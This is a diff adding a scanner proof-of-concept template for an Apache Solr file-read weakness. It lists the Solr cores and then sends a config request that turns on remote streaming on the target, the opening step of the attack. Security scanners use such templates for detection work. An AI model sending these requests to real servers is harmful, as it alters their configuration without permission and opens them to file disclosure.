@@ -1,0 +1,21 @@
+name: poc-yaml-apache-solr-file-read
+rules:
+  - method: GET
+    path: "/solr/admin/cores?indexInfo=false&wt=json"
+    search: |
+      "name":"(?P<core_name>.+?)",
+    expression:
+      response.status == 200
+  - method: POST
+    path: "/solr/{{core_name}}/config"
+    headers:
+      Content-type: application/json
+    body: |
+      {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+    expression: |
+      response.status == 200 && response.body.bcontains(b"This")
+detail:
+  author: flyinbed
+  links:
+    - "https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg"
+    - "https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ"
